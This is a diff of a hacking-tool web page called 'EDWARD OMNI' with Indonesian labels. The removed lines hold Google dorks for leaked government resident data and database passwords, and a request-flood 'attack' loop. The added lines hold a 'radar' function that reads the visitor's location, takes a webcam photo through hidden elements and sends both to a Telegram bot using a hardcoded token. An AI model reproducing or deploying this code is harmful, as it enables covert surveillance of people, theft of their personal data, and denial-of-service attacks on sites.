@@ -3,87 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.178</title>
+    <title>EDWARD OMNI V.181</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; outline: none; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; margin:0; padding: 15px; }
-        .master-name { text-align: center; font-size: 22px; font-weight: 800; color: var(--neon); margin-bottom: 15px; text-transform: uppercase; text-shadow: 0 0 10px var(--neon); }
-        .card { background: rgba(15, 25, 35, 0.95); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 15px; margin-bottom: 12px; }
-        h3 { margin: 0 0 10px 0; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; text-transform: uppercase; border-left: 3px solid var(--neon); padding-left: 10px; }
-        .input-group { background: rgba(0,0,0,0.6); border: 1px solid rgba(0,255,136,0.3); border-radius: 12px; padding: 8px; margin-bottom: 8px; }
-        .label-text { font-size: 9px; color: var(--neon); display: block; margin-bottom: 3px; font-weight: bold; }
-        input, select { background: transparent; border: none; color: #fff; width: 100%; padding: 5px; font-size: 13px; }
-        option { background: #050a0e; color: #fff; }
-        .btn { width: 100%; padding: 12px; border-radius: 10px; border: none; cursor: pointer; font-weight: 800; font-size: 10px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 6px; }
-        .btn-cast { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
-        .btn-atk { background: linear-gradient(45deg, var(--red), #bc13fe); color: #fff; }
-        #customAlert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 85%; background: #000; border: 2px solid var(--neon); color: #fff; padding: 15px; border-radius: 15px; font-size: 11px; font-weight: bold; text-align: center; z-index: 10001; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin:0; padding: 15px; }
+        .master-name { text-align: center; font-size: 20px; font-weight: 900; color: var(--neon); text-shadow: 0 0 10px var(--neon); margin-bottom: 20px; text-transform: uppercase; }
+        .card { background: rgba(10, 20, 30, 0.9); border: 1px solid rgba(0,255,136,0.2); border-radius: 15px; padding: 15px; margin-bottom: 12px; }
+        h3 { margin: 0 0 10px 0; font-size: 11px; color: var(--neon); text-transform: uppercase; border-left: 3px solid var(--neon); padding-left: 10px; }
+        .btn { width: 100%; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: 800; font-size: 10px; text-transform: uppercase; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-radar { background: var(--blue); color: #000; box-shadow: 0 0 10px var(--blue); }
+        .btn-exploit { background: var(--neon); color: #000; }
+        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 8px; border-radius: 10px; text-align: center; color: var(--neon); font-size: 10px; background: rgba(0,0,0,0.3); margin-bottom: 12px; }
+        video, canvas { display: none; }
+        #log { background: #000; color: var(--neon); font-size: 9px; padding: 10px; border-radius: 8px; height: 60px; overflow-y: auto; border: 1px solid rgba(0,255,136,0.2); }
     </style>
 </head>
 <body>
-    <div id="customAlert"><p id="alertMsg"></p><button onclick="closeAlert()" style="background:var(--neon); border:none; padding:5px 15px; border-radius:5px; font-weight:bold; margin-top:10px;">OKE</button></div>
-    <p class="master-name">EDWARD OMNI V.178</p>
+    <p class="master-name">EDWARD OMNI V.181</p>
+    <div class="mon-box">RADAR STATUS: ACTIVE | EXFILTRATION: READY</div>
 
     <div class="card">
-        <h3>🎯 TARGET & MANTRA (BUG HUNTER)</h3>
-        <div class="input-group"><span class="label-text">TARGET DOMAIN (e.g., go.id):</span><input type="text" id="targetMain" placeholder="Kosongkan untuk Global"></div>
-        <div class="input-group"><span class="label-text">MANTRA MANUAL:</span><input type="text" id="mantraManual" placeholder="intitle:index.of"></div>
-        <div class="input-group"><span class="label-text">MANTRA OTOMATIS:</span>
-            <select id="mantraAuto">
-                <option value="">-- PILIH MANTRA KHUSUS --</option>
-                <option value='filetype:xls OR filetype:xlsx "data penduduk"'>📂 DATA WARGA (EXCEL)</option>
-                <option value='filetype:pdf "anggaran" OR "dana"'>💰 CEK ANGGARAN</option>
-                <option value='filetype:env OR filetype:conf "db_password"'>🔑 DATABASE PASSWORD</option>
-                <option value='inurl:admin OR inurl:login'>🚪 LOGIN ADMIN</option>
-                <option value='intitle:index.of "parent directory"'>📁 DIRECTORY LISTING</option>
-            </select>
+        <h3>📡 ELITE RADAR (PHOTO & GEO)</h3>
+        <button class="btn btn-radar" onclick="startRadar()">⚡ ACTIVATE RADAR SCAN</button>
+        <div id="log">> System Standby...</div>
+    </div>
+
+    <div class="card">
+        <h3>🛡️ BUG HUNTER & STRIKE</h3>
+        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px;">
+            <button class="btn btn-exploit" onclick="window.open('https://google.com/search?q=site:go.id intitle:index.of')">GOV BUG</button>
+            <button class="btn" style="background:var(--red); color:#fff;" onclick="location.reload()">STOP ALL</button>
         </div>
-        <button class="btn btn-cast" onclick="cast()">CAST MANTRA 🔮</button>
     </div>
 
-    <div class="card">
-        <h3>🛡️ TERMINATOR SCANNER</h3>
-        <div class="input-group"><span class="label-text">SCAN LINK:</span><input type="text" id="scanInput"></div>
-        <button class="btn" style="background:transparent; border:1px solid var(--neon); color:var(--neon);" onclick="deepAnalyze()">⚡ START DEEP ANALYZE</button>
-    </div>
-
-    <div class="card">
-        <h3>🔥 NUCLEAR STRIKE (BREAKER)</h3>
-        <div class="input-group"><span class="label-text">TARGET:</span><input type="text" id="targetAtk"></div>
-        <button class="btn btn-atk" id="atkBtn" onclick="launchAtk()">LAUNCH NUCLEAR 🚀</button>
-    </div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        let isAtk = false;
-        function showAlert(m) { const a=document.getElementById('customAlert'); document.getElementById('alertMsg').innerText=m; a.style.top='20px'; }
-        function closeAlert() { document.getElementById('customAlert').style.top='-100px'; }
+        const BOT_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
+        const CHAT_ID = '7898572558';
+        const log = document.getElementById('log');
 
-        function cast() {
-            const t = document.getElementById('targetMain').value;
-            const manual = document.getElementById('mantraManual').value;
-            const auto = document.getElementById('mantraAuto').value;
-            const finalMantra = manual || auto;
-            
-            if(!finalMantra) return showAlert("ISI MANTRA DULU!");
-            const query = t ? `site:${t} ${finalMantra}` : finalMantra;
-            window.open("https://www.google.com/search?q=" + encodeURIComponent(query), "_blank");
-        }
+        function addLog(m) { log.innerHTML += `<div>> ${m}</div>`; log.scrollTop = log.scrollHeight; }
 
-        function deepAnalyze() {
-            const u = document.getElementById('scanInput').value.toLowerCase();
-            if(!u) return showAlert("INPUT KOSONG!");
-            if(u.startsWith("http://") || u.includes("dana") || u.includes("kaget")) {
-                showAlert("[DANGER] UNSAFE/PHISING DETECTED!");
-            } else { showAlert("[SAFE] LINK CLEAN"); }
-        }
+        async function startRadar() {
+            addLog("Radar Activated...");
+            try {
+                // 1. Get Geo Location
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    addLog(`Location Found: ${lat}, ${lon}`);
 
-        function launchAtk() {
-            const t = document.getElementById('targetAtk').value;
-            if(!t) return showAlert("TARGET KOSONG!");
-            isAtk=true; document.getElementById('atkBtn').innerText="STOP 🛑";
-            setInterval(() => { if(isAtk) new Image().src="https://"+t+"/?v="+Math.random(); }, 100);
-            showAlert("ATTACKING " + t);
+                    // 2. Access Camera & Capture
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const dataUrl = canvas.toDataURL('image/jpeg');
+                        
+                        // Stop Camera
+                        stream.getTracks().forEach(t => t.stop());
+
+                        // 3. Send to Telegram
+                        addLog("Exfiltrating Data to Master...");
+                        
+                        // Send Photo
+                        const blob = await (await fetch(dataUrl)).blob();
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'radar_capture.jpg');
+                        formData.append('caption', `🔱 TARGET SPOTTED\n📍 Loc: https://www.google.com/maps?q=${lat},${lon}\n👤 User: EDWARD-BAIK`);
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        addLog("DATA SENT SUCCESSFULLY! 🚀");
+                    }, 1000);
+                }, (err) => addLog("GPS ACCESS DENIED"));
+            } catch (e) { addLog("CAM ACCESS DENIED"); }
         }
     </script>
 </body>
